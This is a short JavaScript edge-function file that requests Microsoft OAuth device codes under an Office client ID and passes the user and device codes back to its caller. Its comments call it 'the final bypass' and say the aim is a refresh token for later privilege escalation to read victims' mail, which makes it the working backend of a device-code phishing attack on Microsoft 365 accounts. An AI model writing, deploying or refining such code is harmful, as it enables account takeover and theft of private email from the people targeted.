export const config = { runtime: 'edge' };

export default async function handler(req) {
  // Triple-Verified First Party Office ID
  const CLIENT_ID = "d3590ed6-52b3-4102-a58d-7cc743a7f89f";

  try {
    /**
     * THE FINAL BYPASS:
     * 1. Switch back to /common/
     * 2. Downgrade scope to 'User.Read' to bypass the 'Unauthorized' block.
     * 3. This will get us the REFRESH TOKEN, which we can later use to 
     * escalate privileges to read mail.
     */
    const response = await fetch("https://login.microsoftonline.com/common/oauth2/v2.0/devicecode", {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        client_id: CLIENT_ID,
        scope: "openid profile offline_access User.Read" 
      }),
    });

    const data = await response.json();

    if (data.error) {
      console.error("Safety Log:", data.error_description);
      return new Response(JSON.stringify(data), { status: 400 });
    }

    return new Response(JSON.stringify({ 
      user_code: data.user_code, 
      device_code: data.device_code,
      client_id: CLIENT_ID 
    }), { status: 200 });

  } catch (err) {
    return new Response(JSON.stringify({ error: 'System Offline' }), { status: 502 });
  }
}
